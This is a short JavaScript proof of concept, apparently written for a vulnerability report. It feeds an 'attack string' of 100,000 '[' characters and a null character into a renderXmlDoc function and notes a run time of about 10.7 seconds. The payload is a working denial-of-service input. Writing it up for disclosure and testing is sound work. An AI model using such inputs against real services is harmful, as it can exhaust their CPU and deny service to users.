const { renderXmlDoc } = require("./dotnetXmlDocumentation.js");

//Attack String :""+"["*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "[";
}
str += "\u0000";

const node = {
  text: str,
  type: "note",
};
var result = renderXmlDoc([node]);

// real    0m10.747s
// user    0m10.713s
// sys     0m0.010s